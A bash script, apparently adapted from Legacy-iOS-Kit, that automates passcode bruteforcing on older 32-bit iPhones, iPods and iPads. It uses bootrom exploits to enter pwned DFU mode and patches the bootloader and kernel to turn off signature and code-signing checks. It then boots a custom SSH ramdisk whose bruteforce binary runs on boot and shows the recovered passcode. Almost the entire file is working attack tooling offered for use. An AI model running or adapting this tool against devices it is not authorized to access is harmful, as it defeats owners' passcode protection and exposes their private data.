#!/usr/bin/env bash

# Bruteforce Tool for 32-bit iOS Devices
# Based on Legacy-iOS-Kit by LukeZGD

ssh_port=6414

[[ "$BASH_VERSION" ]] || { echo "[Error] Run with bash."; exit 1; }
bash_ver=$(/usr/bin/env bash -c 'echo ${BASH_VERSINFO[0]}')

# ==================== UTILITY FUNCTIONS ====================

print() { echo "${color_B}${1}${color_N}"; }
input() { echo "${color_Y}[Input] ${1}${color_N}"; }
log() { echo "${color_G}[Log] ${1}${color_N}"; }
warn() { echo "${color_Y}[WARNING] ${1}${color_N}"; }
error() {
    echo -e "${color_R}[Error] ${1}${color_N}"
    [[ -n "$2" ]] && echo -e "${color_Y}${*:2}${color_N}"
    exit 1
}
pause() { input "Press Enter to continue (Ctrl+C to cancel)"; read -s; }

clean() {
    kill $iproxy_pid 2>/dev/null
    popd &>/dev/null
    rm -rf "$(dirname "$0")/tmp$$/" 2>/dev/null
    [[ $platform == "macos" ]] && killall -CONT AMPDevicesAgent AMPDeviceDiscoveryAgent MobileDeviceUpdater 2>/dev/null
}

clean_usbmuxd() {
    clean
    sudo kill $sudoloop_pid 2>/dev/null
    sudo killall -9 usbmuxd usbmuxd2 2>/dev/null
    [[ $(command -v systemctl) ]] && sudo systemctl restart usbmuxd
}

display_help() {
    echo "
 BRUTEFORCE A4 DEVICE

Usage: ./Bruteforce.sh [Options]

Options:
    --help              Display this help
    --entry-device      Manual device entry
    --debug             Enable debugging

Supported: iPhone 4, iPod touch 4 ,iPad 1
    "
}



# ==================== TOOL PATHS ====================

set_tool_paths() {
    if [[ $OSTYPE == "linux"* ]]; then
        source /etc/os-release 2>/dev/null
        platform="linux"
        platform_ver="$PRETTY_NAME"
        [[ $(uname -m) == "a"* && $(getconf LONG_BIT) == 64 ]] && platform_arch="arm64" || platform_arch="x86_64"
        dir="../bin/linux/$platform_arch"
        export LD_LIBRARY_PATH="$dir/lib"
        bspatch="$dir/bspatch"
        scp2="$dir/scp"; ssh2="$dir/ssh"
        cp $ssh2 . 2>/dev/null; chmod +x ssh 2>/dev/null
        trap "clean_usbmuxd" EXIT
        print "* Enter your user password when prompted"
        sudo -v
        (while true; do sudo -v; sleep 60; done) &
        sudoloop_pid=$!
        gaster="sudo $dir/gaster"; ipwnder="sudo $dir/ipwnder"
        irecovery="sudo $dir/irecovery"; primepwn="sudo $dir/primepwn"
        sudo killall -9 usbmuxd usbmuxd2 2>/dev/null
        sudo -b $dir/usbmuxd -pf 2>/dev/null
    elif [[ $OSTYPE == "darwin"* ]]; then
        platform="macos"
        platform_ver="$(sw_vers -productVersion)"
        platform_arch="$(uname -m)"
        dir="../bin/macos"
        [[ $platform_arch == "arm64" ]] && dir+="/arm64"
        xcode-select -p &>/dev/null || error "Install Xcode CLT: xcode-select --install"
        /usr/bin/xattr -cr ../bin/macos 2>/dev/null
        bspatch="$(command -v bspatch)"
        scp2="/usr/bin/scp"; ssh2="/usr/bin/ssh"
        gaster="$dir/gaster"; ipwnder="$dir/ipwnder"
        irecovery="$dir/irecovery"; primepwn="$dir/primepwn"
        killall -STOP AMPDevicesAgent AMPDeviceDiscoveryAgent MobileDeviceUpdater 2>/dev/null
        trap "clean" EXIT
    else
        error "Platform not supported."
    fi
    log "Platform: $platform ($platform_ver - $platform_arch)"
    [[ ! -d $dir ]] && error "Bin directory not found: $dir"
    chmod +x $dir/* 2>/dev/null
    aria2c="$(command -v aria2c)"; [[ -z $aria2c ]] && aria2c="$dir/aria2c"
    aria2c+=" --no-conf --download-result=hide"
    curl="$(command -v curl)"
    ideviceinfo="$dir/ideviceinfo"
    jq="$dir/jq"
    cp ../resources/ssh_config . 2>/dev/null
    [[ $(ssh -V 2>&1 | grep -c "SSH_[89]\|SSH_1") != 0 ]] && echo "    PubkeyAcceptedAlgorithms +ssh-rsa" >> ssh_config
    scp2+=" -F ./ssh_config"; ssh2+=" -F ./ssh_config"
}

# ==================== DOWNLOAD FUNCTIONS ====================

download_from_url() {
    local url="$1" file="$2"
    [[ -n "$file" ]] && rm -f "$file"
    if [[ -n "$file" ]]; then
        $aria2c "$url" -o "$file" 2>/dev/null || $curl -sL "$url" -o "$file" || wget -qO "$file" "$url"
    else
        $aria2c "$url" 2>/dev/null || $curl -sLO "$url" || wget -q "$url"
    fi
}

download_appledb() {
    local query="$1"
    if [[ $query == "ios" ]]; then
        local phone="iOS" build_id="$2"
        case $build_id in
            1[AC]* | [2345]* ) phone="iPhone%20Software";;
            7* ) phone="iPhone%20OS";;
        esac
        query="ios/${phone};${build_id}"
    fi
    for url in "https://api.appledb.dev/${query}.json" "https://raw.githubusercontent.com/littlebyteorg/appledb/gh-pages/${query}.json"; do
        download_from_url "$url" tmp.json
        [[ -s tmp.json ]] && break
    done
    [[ ! -s tmp.json ]] && error "Failed to get AppleDB request."
}

# ==================== DEVICE FUNCTIONS ====================

device_get_name() {
    case $device_type in
        iPhone1,1) device_name="iPhone 2G";; iPhone1,2) device_name="iPhone 3G";;
        iPhone2,1) device_name="iPhone 3GS";; iPhone3,*) device_name="iPhone 4";;
        iPhone4,1) device_name="iPhone 4S";; iPhone5,*) device_name="iPhone 5/5C";;
        iPad1,1) device_name="iPad 1";; iPad2,[1234]) device_name="iPad 2";;
        iPad2,[567]) device_name="iPad mini 1";; iPad3,[123]) device_name="iPad 3";;
        iPad3,[456]) device_name="iPad 4";;
        iPod1,1) device_name="iPod touch 1";; iPod2,1) device_name="iPod touch 2";;
        iPod3,1) device_name="iPod touch 3";; iPod4,1) device_name="iPod touch 4";;
        iPod5,1) device_name="iPod touch 5";; *) device_name="$device_type";;
    esac
}

device_get_info() {
    if [[ $main_argmode == "device_enter_ramdisk_menu" ]]; then
        log "Assuming device is in SSH ramdisk mode"
        device_mode="Normal"
    else
        log "Finding device..."
        $ideviceinfo -s >/dev/null 2>&1 && device_mode="Normal"
        [[ -z $device_mode ]] && device_mode="$($irecovery -q 2>/dev/null | grep -w "MODE" | cut -c 7-)"
    fi
    [[ -z $device_mode ]] && error "No device found! Connect your iOS device."
    
    case $device_mode in
        "DFU" | "Recovery" )
            [[ -n $device_argmode ]] && device_entry || {
                device_type=$($irecovery -q | grep "PRODUCT" | cut -c 10-)
                device_ecid=$(printf "%d" $($irecovery -q | grep "ECID" | cut -c 7-))
                device_model=$($irecovery -q | grep "MODEL" | cut -c 8-)
            }
            device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
        ;;
        "Normal" )
            [[ -n $device_argmode ]] && device_entry || {
                device_type=$($ideviceinfo -s -k ProductType)
                [[ -z $device_type ]] && device_type=$($ideviceinfo -k ProductType)
                device_ecid=$($ideviceinfo -s -k UniqueChipID)
                device_model=$($ideviceinfo -s -k HardwareModel)
                device_vers=$($ideviceinfo -s -k ProductVersion)
                device_udid=$($ideviceinfo -s -k UniqueDeviceID)
            }
        ;;
    esac
    device_model="$(echo $device_model | tr '[:upper:]' '[:lower:]')"; device_model="${device_model%??}"
    device_get_name
    echo
    print "* Device: $device_name ($device_type)"
    print "* Mode: $device_mode"
    [[ -n $device_vers ]] && print "* iOS: $device_vers"
    print "* ECID: $device_ecid"
    echo
    
    case $device_type in
        iPhone3,[123] | iPod4,1 ) device_proc=4;;
        iPad2,* | iPad3,[123] | iPhone4,1 | iPod5,1 ) device_proc=5;;
        iPad3,[456] | iPhone5,* ) device_proc=6;;
        *) error "Device not supported: $device_type";;
    esac
    all_flash="Firmware/all_flash/all_flash.${device_model}ap.production"
    device_fw_dir="../saved/firmware/$device_type"
    mkdir -p $device_fw_dir ../saved/$device_type
}

device_entry() {
    log "Manual device entry enabled."
    until [[ -n $device_type && $device_type == iP* ]]; do read -p "$(input 'Device type (eg. iPad2,1): ')" device_type; done
    until [[ -n $device_ecid ]] && [ "$device_ecid" -eq "$device_ecid" ] 2>/dev/null; do read -p "$(input 'ECID (decimal): ')" device_ecid; done
}

device_find_mode() {
    local i=0 timeout=${2:-10}
    log "Finding device in $1 mode..."
    while (( i < timeout )); do
        device_mode="$($irecovery -q 2>/dev/null | grep -w "MODE" | cut -c 7-)"
        [[ $device_mode == "$1" ]] && { log "Found device in $1 mode."; return; }
        sleep 1; ((i++))
    done
    error "Failed to find device in $1 mode."
}

device_dfuhelper() {
    [[ $device_mode == "DFU" ]] && { log "Already in DFU mode"; return; }
    echo
    print "* DFU Mode Helper"
    print "* Get ready to enter DFU mode."
    pause
    echo
    print "* Hold TOP and HOME buttons..."
    for i in {10..1}; do echo -n "$i "; sleep 1; done
    echo
    print "* Release TOP, keep holding HOME..."
    for i in {8..1}; do echo -n "$i "; sleep 1; done
    echo
    device_find_mode DFU
}

device_enter_mode() {
    case $1 in
        "Recovery" )
            [[ $device_mode == "Normal" ]] && {
                log "Entering recovery mode..."
                "$dir/ideviceenterrecovery" "$device_udid" >/dev/null
                device_find_mode Recovery 50
            }
        ;;
        "DFU" )
            [[ $device_mode == "Normal" ]] && device_enter_mode Recovery
            [[ $device_mode == "DFU" ]] && return
            device_dfuhelper
        ;;
        "pwnDFU" )
            [[ $device_mode == "DFU" ]] && device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
            
            
            if [[ $device_proc == 5 ]]; then
                if [[ -n $device_pwnd ]]; then
                    log "Already in pwned DFU: $device_pwnd"
                else
                    [[ $device_mode != "DFU" ]] && device_enter_mode DFU
                    echo
                    print "* A5(X) device detected - checkm8-a5 required"
                    print "* You need Raspberry Pi Pico or Arduino+USB Host Shield"
                    print "* Details: https://github.com/LukeZGD/checkm8-a5"
                    echo
                    log "Pwn device with checkm8-a5, then plug it back and press Enter."
                    pause
                    device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
                    [[ -z $device_pwnd ]] && error "Device NOT in pwned DFU mode."
                    log "Found device in pwned DFU: $device_pwnd"
                fi
                return
            fi
            
            
            [[ -n $device_pwnd ]] && { log "Already in pwned DFU: $device_pwnd"; return; }
            
            device_enter_mode DFU
            
           
            local tool
            if [[ $device_proc == 4 ]]; then
                tool="primepwn"
                [[ $platform == "macos" && $platform_arch == "arm64" ]] && tool="reipwnder"
            elif [[ $device_proc == 6 ]]; then
                tool="ipwnder"
                if [[ $platform == "macos" ]]; then
                    tool="ipwnder32"
                    [[ $platform_arch == "arm64" ]] && tool="ipwnder_lite"
                fi
            fi
            
            log "Placing device in pwnDFU using $tool"
            case $tool in
                "primepwn" ) $primepwn;;
                "reipwnder" )
                    mkdir -p shellcode
                    cp ../resources/limera1n-shellcode.bin shellcode/
                    ../bin/macos/reipwnder -p
                ;;
                "ipwnder" ) $ipwnder -p;;
                "ipwnder32" ) "$dir/ipwnder32" -p --noibss;;
                "ipwnder_lite" ) $ipwnder -d;;
            esac
            sleep 1
            device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
            [[ -z $device_pwnd ]] && error "Failed to pwn device."
            log "Device in pwned DFU: $device_pwnd"
        ;;
    esac
}

# ==================== FIRMWARE KEY FUNCTIONS ====================

device_fw_key_check() {
    local build="${1:-$device_target_build}"
    local keys_path="$device_fw_dir/$build"
    log "Checking firmware keys..."
    [[ $(cat "$keys_path/index.html" 2>/dev/null | grep -c "$build") != 1 ]] && rm -f "$keys_path/index.html"
    if [[ ! -e "$keys_path/index.html" ]]; then
        mkdir -p "$keys_path"
        for url in "https://raw.githubusercontent.com/LukeZGD/Legacy-iOS-Kit-Keys/master/$device_type/$build/index.html" \
                   "https://api.m1sta.xyz/wikiproxy/$device_type/$build"; do
            download_from_url "$url" index.html
            [[ $(cat index.html 2>/dev/null | grep -c "$build") == 1 ]] && break
            rm -f index.html
        done
        [[ $(cat index.html 2>/dev/null | grep -c "$build") != 1 ]] && error "Failed to get firmware keys."
        mv index.html "$keys_path/"
    fi
    device_fw_key="$(cat $keys_path/index.html)"
}

ipsw_get_url() {
    local build_id="$1"
    ipsw_url="$(cat "$device_fw_dir/$build_id/url" 2>/dev/null)"
    [[ -z $ipsw_url || $(echo "$ipsw_url" | grep -c '<') != 0 ]] && {
        log "Getting IPSW URL..."
        download_appledb ios $build_id
        ipsw_url="$(cat tmp.json | $jq -r ".sources[] | select(.type == \"ipsw\" and any(.deviceMap[]; . == \"$device_type\")) | .links[0].url")"
        [[ -z $ipsw_url ]] && error "Unable to get URL for $device_type-$build_id"
        mkdir -p $device_fw_dir/$build_id
        echo "$ipsw_url" > $device_fw_dir/$build_id/url
    }
}

# ==================== VERSION  ====================

select_ramdisk_version() {
    echo
    if [[ $device_type == "iPad1,1" ]]; then
        # iPad 1: use iOS 5.1.1
        print "* Using iOS 5.1.1 (9B206) for iPad 1"
        device_target_build="9B206"
    elif [[ $device_proc == 4 ]]; then
        print "* Using iOS 6.1.3 (10B329) for A4 device"
        device_target_build="10B329"
    else
        print "* A5/A6 device - select iOS version:"
        print "  1. iOS 6.1.3 (10B329)"
        print "  2. iOS 9.0.2 (13A452) [default]"
        read -p "$(input 'Enter choice [1/2]: ')" ver_choice
        case "${ver_choice:-2}" in
            1) device_target_build="10B329";;
            *) device_target_build="13A452";;
        esac
    fi
    log "Using build: $device_target_build"
}

# ==================== SSHRAMDISK ====================

device_ramdisk() {
    local comps=("iBSS" "iBEC" "DeviceTree" "Kernelcache" "RestoreRamdisk")
    local name iv key path ramdisk_path build_id

    select_ramdisk_version
    build_id="$device_target_build"
    
    device_fw_key_check
    ipsw_get_url $build_id
    ramdisk_path="../saved/$device_type/ramdisk_$build_id"
    mkdir -p $ramdisk_path

    for getcomp in "${comps[@]}"; do
        name=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "'$getcomp'") | .filename')
        iv=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "'$getcomp'") | .iv')
        key=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "'$getcomp'") | .key')
        case $getcomp in
            "iBSS" | "iBEC" ) path="Firmware/dfu/";;
            "DeviceTree" ) path="$all_flash/";;
            * ) path="";;
        esac
        [[ -z $name ]] && {
            local hwmodel="$device_model"
            case $build_id in [789]* | 10* | 11* | 13* ) hwmodel+="ap";; esac
            case $getcomp in
                "iBSS" | "iBEC" ) name="$getcomp.$hwmodel.RELEASE.dfu";;
                "DeviceTree" ) name="$getcomp.${device_model}ap.img3";;
                "Kernelcache" ) name="kernelcache.release.$hwmodel";;
            esac
        }
        log "$getcomp"
        [[ -s $ramdisk_path/$name ]] && cp $ramdisk_path/$name . || "$dir/pzb" -g "${path}$name" -o "$name" "$ipsw_url"
        [[ ! -s $name ]] && error "Failed to get $name."
        [[ ! -s $ramdisk_path/$name ]] && cp $name $ramdisk_path/
        mv $name $getcomp.orig
        "$dir/xpwntool" $getcomp.orig $getcomp.dec -iv $iv -k $key -decrypt
    done

    log "Patching RestoreRamdisk..."
    "$dir/xpwntool" RestoreRamdisk.dec Ramdisk.raw
    "$dir/hfsplus" Ramdisk.raw grow 30000000
    "$dir/hfsplus" Ramdisk.raw untar ../resources/sshrd/sbplist.tar 2>/dev/null
    "$dir/hfsplus" Ramdisk.raw untar ../resources/sshrd/ssh.tar
    "$dir/hfsplus" Ramdisk.raw mv sbin/reboot sbin/reboot_bak 2>/dev/null
    
    log "Adding bruteforce tools to ramdisk..."
    if [[ -s ../resources/bruteforce ]]; then
        "$dir/hfsplus" Ramdisk.raw add ../resources/bruteforce usr/bin/bruteforce
        "$dir/hfsplus" Ramdisk.raw chmod 755 usr/bin/bruteforce
    fi
    if [[ -s ../resources/device_infos ]]; then
        "$dir/hfsplus" Ramdisk.raw add ../resources/device_infos usr/bin/device_infos
        "$dir/hfsplus" Ramdisk.raw chmod 755 usr/bin/device_infos
    fi
    
    
    if [[ -s ../resources/restored_external ]]; then
        "$dir/hfsplus" Ramdisk.raw rm usr/local/bin/restored_external.real 2>/dev/null
        "$dir/hfsplus" Ramdisk.raw add ../resources/restored_external usr/local/bin/restored_external.sshrd
        "$dir/hfsplus" Ramdisk.raw chmod 755 usr/local/bin/restored_external.sshrd
    fi
    if [[ -s ../resources/setup.sh ]]; then
        "$dir/hfsplus" Ramdisk.raw rm usr/local/bin/restored_external 2>/dev/null
        "$dir/hfsplus" Ramdisk.raw add ../resources/setup.sh usr/local/bin/restored_external
        "$dir/hfsplus" Ramdisk.raw chmod 755 usr/local/bin/restored_external
    fi
    log "Configured auto-run bruteforce on boot."
    
    "$dir/xpwntool" Ramdisk.raw Ramdisk.dmg -t RestoreRamdisk.dec

    # Patch iBSS
    log "Patching iBSS..."
    "$dir/xpwntool" iBSS.dec iBSS.raw
    "$dir/iBoot32Patcher" iBSS.raw iBSS.patched --rsa --debug
    "$dir/xpwntool" iBSS.patched iBSS -t iBSS.dec

    # Patch iBEC
    log "Patching iBEC..."
    "$dir/xpwntool" iBEC.dec iBEC.raw
    "$dir/iBoot32Patcher" iBEC.raw iBEC.patched --rsa --debug -b "rd=md0 -v amfi=0xff cs_enforcement_disable=1"
    "$dir/xpwntool" iBEC.patched iBEC -t iBEC.dec

    #ipad 1 kernel patch disable 
    if [[ $device_type == "iPad1,1" ]]; then
        log "iPad 1 detected - skipping kernel patch."
        mv Kernelcache.dec Kernelcache.dec.bak
        cp Kernelcache.dec.bak Kernelcache.dec
    else
        log "Patching Kernelcache..."
        cp Kernelcache.dec Kernelcache.dec.bak
        "$dir/xpwntool" Kernelcache.dec Kernelcache.raw
        if [[ -s ../resources/kernel_patch.py ]]; then
            python3 ../resources/kernel_patch.py Kernelcache.raw
            if [[ -s Kernelcache.patched ]]; then
                "$dir/xpwntool" Kernelcache.patched Kernelcache.dec -t Kernelcache.dec.bak
                log "Kernel patched successfully."
            else
                warn "Kernel patch script did not produce output, using unpatched kernel."
                mv Kernelcache.dec.bak Kernelcache.dec
            fi
        else
            warn "kernel_patch.py not found, skipping kernel patch."
            mv Kernelcache.dec.bak Kernelcache.dec
        fi
    fi

    mv iBSS iBEC DeviceTree.dec Kernelcache.dec Ramdisk.dmg $ramdisk_path 2>/dev/null
    log "Ramdisk files saved: saved/$device_type/ramdisk_$build_id"

    device_enter_mode pwnDFU

patch_ibss() {
    local build_id="${device_target_build:-12H321}"
    
    # A5 fallback for older versions
    case $build_id in
        [56789]* )
            case $device_type in
                iPad2,* | iPad3,[123] | iPod5,1 ) build_id="12H321";;  # A5
                iPad3,[456] | iPhone5,* ) build_id="12H321";;  # A6
                * ) build_id="10B329";;  # Fallback
            esac
            log "Using iBSS from build $build_id for A5/A6 workaround"
        ;;
    esac
    
    log "Creating pwnediBSS from build $build_id..."
    device_fw_key_check $build_id
    ipsw_get_url $build_id
    local name iv key hwmodel="$device_model"
    case $build_id in [789]* | 10* | 11* | 12* | 13* | 14* ) hwmodel+="ap";; esac
    name="iBSS.$hwmodel.RELEASE.dfu"
    
    mkdir -p ../saved/$device_type
    [[ -s ../saved/$device_type/pwnediBSS_$build_id ]] && {
        cp ../saved/$device_type/pwnediBSS_$build_id pwnediBSS
        log "Using cached pwnediBSS."
        return
    }
    
    [[ -s ../saved/$device_type/iBSS_$build_id.dfu ]] && cp ../saved/$device_type/iBSS_$build_id.dfu iBSS.orig || \
        "$dir/pzb" -g "Firmware/dfu/$name" -o iBSS.orig "$ipsw_url"
    [[ ! -s iBSS.orig ]] && error "Failed to get iBSS."
    cp iBSS.orig ../saved/$device_type/iBSS_$build_id.dfu 2>/dev/null
    iv=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "iBSS") | .iv')
    key=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "iBSS") | .key')
    "$dir/xpwntool" iBSS.orig iBSS.dec -iv $iv -k $key -decrypt
    "$dir/xpwntool" iBSS.dec iBSS.raw
    "$dir/iBoot32Patcher" iBSS.raw pwnediBSS --rsa
    
    if [[ ! -s pwnediBSS ]]; then
        error "Failed to create pwnediBSS."
    fi
    
    cp pwnediBSS ../saved/$device_type/pwnediBSS_$build_id
    log "pwnediBSS created."
}

ipwndfu_send_ibss() {
    [[ ! -s pwnediBSS ]] && [[ ! -s ../saved/$device_type/pwnediBSS ]] && patch_ibss
    [[ -s ../saved/$device_type/pwnediBSS ]] && cp ../saved/$device_type/pwnediBSS .
    [[ ! -s pwnediBSS ]] && error "pwnediBSS not found."
    
    log "Sending pwnediBSS using ipwndfu..."
    local python2="$(command -v python2)"
    local pyenv2="$HOME/.pyenv/versions/2.7.18/bin/python2"
    [[ -z $python2 && -e $pyenv2 ]] && python2="$pyenv2"
    [[ $platform == "macos" ]] && (( $(sw_vers -productVersion | cut -d. -f1) < 12 )) && python2="/usr/bin/python"
    
    if [[ -z $python2 ]]; then
        warn "python2 not found. Install with: pyenv install 2.7.18"
        error "Cannot send iBSS without python2/ipwndfu."
    fi
    
    # Setup ipwndfu
    mkdir -p ../resources/ipwndfu
    if [[ ! -s ../resources/ipwndfu/ipwndfu ]]; then
        log "Downloading ipwndfu..."
        download_from_url "https://github.com/LukeZGD/ipwndfu/archive/refs/heads/master.zip" ipwndfu.zip
        unzip -q ipwndfu.zip -d ../resources/
        rm -rf ../resources/ipwndfu
        mv ../resources/ipwndfu-* ../resources/ipwndfu
    fi
    
    # Setup libusb symlink for macOS
    if [[ $platform == "macos" ]]; then
        [[ -e /opt/local/lib/libusb-1.0.dylib ]] && ln -sf /opt/local/lib "$HOME/lib"
        [[ -e /opt/homebrew/lib/libusb-1.0.dylib ]] && ln -sf /opt/homebrew/lib "$HOME/lib"
        [[ -e /usr/local/lib/libusb-1.0.dylib ]] && ln -sf /usr/local/lib "$HOME/lib"
    fi
    
    cp pwnediBSS ../resources/ipwndfu/
    pushd ../resources/ipwndfu >/dev/null
    "$python2" ipwndfu -l pwnediBSS
    local ret=$?
    popd >/dev/null
    [[ $ret != 0 ]] && error "Failed to send pwnediBSS."
    log "pwnediBSS sent successfully."
    sleep 2
}

    
    if [[ $device_proc == 5 ]]; then
        
        ipwndfu_send_ibss
        
        log "Waiting for device to reconnect..."
        sleep 3
        
        $irecovery -q >/dev/null 2>&1 || {
            log "Waiting for DFU mode..."
            device_find_mode DFU 10
        }
        
        log "Sending iBEC..."
        $irecovery -f $ramdisk_path/iBEC
        $irecovery -c go
        sleep 3
    else
        
        log "Sending iBSS..."; $irecovery -f $ramdisk_path/iBSS; sleep 2
        log "Sending iBEC..."; $irecovery -f $ramdisk_path/iBEC; sleep 3
    fi
    device_find_mode Recovery
    log "Sending ramdisk..."; $irecovery -f $ramdisk_path/Ramdisk.dmg; $irecovery -c ramdisk; sleep 2
    log "Sending DeviceTree..."; $irecovery -f $ramdisk_path/DeviceTree.dec; $irecovery -c devicetree
    log "Sending Kernelcache..."; $irecovery -f $ramdisk_path/Kernelcache.dec; $irecovery -c bootx
    log "Booting..."
    log "Bruteforce will auto-run on device screen."
    print "* Passcode will be shown on device when found."
}

device_enter_ramdisk() { device_ramdisk; }

# ==================== MAIN ====================

main() {
    clear
    echo "======================================"
    echo "::"
    echo "::    Bruteforce Passcode For A4 IOS Device"
    echo "::"
    echo "::    BUILD_TAG: 1.0"
    echo "::"
    echo "::    BUILD_SYTLE: RELEASE"
    echo "::"
    echo "::    BASE: LEGACY-IOS-KIT BY LUKEZGD"
    echo "::"
    echo "======================================"
    echo
    [[ $EUID == 0 ]] && error "Do not run as root."
    [[ ! -d "../resources" ]] && error "Resources folder not found."
    set_tool_paths
    device_get_info
    device_enter_ramdisk
}

# ==================== INIT ====================

color_R=$(tput setaf 1); color_G=$(tput setaf 2); color_Y=$(tput setaf 3)
color_B=$(tput setaf 6); color_N=$(tput sgr0)

for arg in "$@"; do
    case $arg in
        "--debug" ) set -x;;
        "--help" ) display_help; exit;;
        "--sshrd" ) ;; # default
        "--entry-device" ) device_argmode="entry";;
    esac
done

mkdir -p "tmp$$"; cd "tmp$$" || exit 1
main
